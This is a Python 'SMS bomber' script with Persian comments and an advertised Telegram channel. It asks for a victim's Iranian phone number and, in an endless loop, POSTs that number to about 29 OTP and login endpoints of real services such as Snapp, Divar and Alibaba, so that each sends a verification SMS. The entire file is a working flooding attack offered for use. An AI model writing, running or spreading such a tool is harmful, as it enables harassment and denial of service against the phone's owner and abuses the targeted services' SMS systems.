import requests
import os

red='\033[31m'
green='\033[32m'

# تعریف URL‌ها
urls = [
    "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
    "https://api.divar.ir/v5/auth/authenticate",
    "https://nobat.ir/api/public/patient/login/phone",
    "https://api.alopeyk.com/api/v2/login?platform=pwa",
    "https://api.alopeyk.com/api/v2/register-customer?platform=pwa",
    "https://shahrfarsh.com/Account/Login",
    "https://www.digistyle.com/users/login-register/",
    "https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/",
    "https://api.digikalajet.ir/user/login-register/",
    "https://digitalsignup.snapp.ir/ds3/api/v3/otp",
    "https://api.ostadkr.com/login",
    "https://www.miare.ir/api/otp/driver/request/",
    "https://api.tapsi.ir/api/v2.2/user",
    "https://mobapi.banimode.com/api/v2/auth/request",
    "https://drdr.ir/api/v3/auth/login/mobile/init",
    "https://gw.taaghche.com/v4/site/auth/login",
    "https://gw.taaghche.com/v4/site/auth/signup",
    "https://api.komodaa.com/api/v2.6/loginRC/request",
    "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode",
    "https://uiapi2.saapa.ir/api/otp/sendCode",
    "https://api.vandar.io/account/v1/check/mobile",
    "https://api.mobit.ir/api/web/v8/register/register",
    "https://taraazws.jabama.com/api/v4/account/send-code",
    "https://api.pinorest.com/frontend/auth/login/mobile",
    "https://service.tetherland.com/api/v5/login-register",
    "https://ws.alibaba.ir/api/v3/account/mobile/otp",
    "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token",
    "https://student.classino.com/otp/v1/api/logi",
    "https://takshopaccessorise.ir/api/v1/sessions/login_request"
]

# پاک کردن صفحه کنسول
os.system("clear")
# نصب پکیج figlet
os.system("pkg install figlet -y")
os.system("clear")

# چاپ عنوان با رنگ قرمز
print(f"{red} ")
os.system("figlet sms bomber")
print(f"{green}===========================================")
print("  telegram channel: @VPN_Alexabot            ")
print(f"{green}===========================================")

# چاپ منوی انتخابی
print("[1]start")
print("[2]exit")

# دریافت انتخاب کاربر
king = int(input("[~]Bad_boy==>"))

# اگر کاربر گزینه start را انتخاب کند
if king == 1:
    hacker = input("Enter phone Number (9++++++) : ")
    while True:
        for url in urls:
            # ارسال درخواست POST به هر URL
            requests.post(url, data={"cellphone": "+98" + hacker})
            print("sended to =>", hacker)
# اگر کاربر گزینه exit را انتخاب کند
elif king == 2:
    os.system("clear")
    print("have nice day =) ")
